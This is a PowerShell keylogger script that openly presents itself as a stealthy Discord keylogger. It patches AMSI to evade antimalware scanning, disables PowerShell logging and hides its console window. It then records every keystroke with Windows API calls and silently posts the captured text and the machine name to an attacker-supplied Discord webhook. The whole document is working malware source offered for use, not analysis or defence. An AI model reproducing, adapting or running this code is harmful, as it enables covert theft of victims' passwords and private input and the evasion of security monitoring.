<#
.SYNOPSIS
Improved Discord Keylogger with dynamic webhook parameter and stealth features.

.DESCRIPTION
This PowerShell keylogger captures keystrokes and sends them to a Discord webhook.
The webhook URL is passed as a parameter to avoid exposing it in the source code.

.PARAMETER dc
Specifies the Discord webhook URL to send captured keystrokes.

.EXAMPLE
powershell.exe -ExecutionPolicy Bypass -File .\Improved-Keylogger.ps1 -dc "https://discord.com/api/webhooks/..." 
#>

param(
    [Parameter(Mandatory = $true)]
    [string]$dc
)

# AMSI Patch - Antimalware Scan Interface bypass
$var = [Ref].Assembly.GetType('System.Management.Automation.'+'AmsiContext')
$field = $var.GetField('amsiContext','NonPublic,Instance')
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
$field.SetValue($null, $mem)
[System.Runtime.InteropServices.Marshal]::WriteInt32($mem, 0x00000000)

# ETW Patch - Event Tracing for Windows disable (logging bypass)
$var = [Ref].Assembly.GetType('System.Management.Automation.'+'Utils')
$field = $var.GetField('cachedGroupPolicySettings', 'NonPublic,Static')
$field.SetValue($null, $null)

# Hide Console Window
$Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
$Type = Add-Type -MemberDefinition $Async -Name Win32ShowWindowAsync -Namespace Win32Functions -PassThru
$hwnd = (Get-Process -PID $pid).MainWindowHandle
if ($hwnd -ne [System.IntPtr]::Zero) {
    $Type::ShowWindowAsync($hwnd, 0)
} else {
    $Host.UI.RawUI.WindowTitle = 'hideme'
    Start-Sleep -Seconds 1
    $Proc = Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' }
    if ($Proc) {
        $hwnd = $Proc.MainWindowHandle
        $Type::ShowWindowAsync($hwnd, 0)
    }
}

# Import Windows API functions
$API = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@
Add-Type -MemberDefinition $API -Name Win32 -Namespace API -PassThru

# Stopwatch for inactivity detection
$LastKeypressTime = [System.Diagnostics.Stopwatch]::StartNew()
$KeypressThreshold = [TimeSpan]::FromSeconds(10)
$send = ""
$CapsLock = $null
$ScrollLock = $null

# Main loop
while ($true) {
    $keyPressed = $false
    while ($LastKeypressTime.Elapsed -lt $KeypressThreshold) {
        Start-Sleep -Milliseconds 30
        for ($asc = 8; $asc -le 254; $asc++) {
            $keyst = [Win32.API]::GetAsyncKeyState($asc)
            if ($keyst -eq -32767) {
                $keyPressed = $true
                $LastKeypressTime.Restart()

                # Detect CapsLock and ScrollLock to avoid suspicion
                $CapsLock = [console]::CapsLock
                $ScrollLock = [console]::NumberLock

                $vtkey = [Win32.API]::MapVirtualKey($asc, 3)
                $kbst = New-Object Byte[] 256
                [Win32.API]::GetKeyboardState($kbst)
                $logchar = New-Object System.Text.StringBuilder

                if ([Win32.API]::ToUnicode($asc, $vtkey, $kbst, $logchar, 10, 0)) {
                    $LString = $logchar.ToString()

                    switch ($asc) {
                        8  { $LString = "[BKSP]" }
                        13 { $LString = "[ENT]" }
                        27 { $LString = "[ESC]" }
                        32 { $LString = " " }
                        160 { $LString = "[SHIFT]" }
                        162 { $LString = "[CTRL]" }
                        91 { $LString = "[WIN]" }
                        92 { $LString = "[WIN]" }
                        164 { $LString = "[ALT]" }
                        default {}
                    }

                    $send += $LString
                }
            }
        }
    }

    if ($keyPressed) {
        try {
            $timestamp = Get-Date -Format "dd-MM-yyyy HH:mm:ss"
            $escmsgsys = $send -replace '[&<>]', { $args[0].Value.Replace('&', '&amp;').Replace('<', '<').Replace('>', '>') }
            $escmsg = "$timestamp : `$ $escmsgsys`$"

            $jsonsys = @{
                username = "$env:COMPUTERNAME"
                content  = $escmsg
            } | ConvertTo-Json

            Invoke-RestMethod -Uri $dc -Method Post -ContentType "application/json" -Body $jsonsys -ErrorAction Stop

            # Reset buffer
            $send = ""
            $keyPressed = $false
        } catch {
            # Hata durumunda sessizce devam et
        }
    }

    $LastKeypressTime.Restart()
    Start-Sleep -Milliseconds 10
}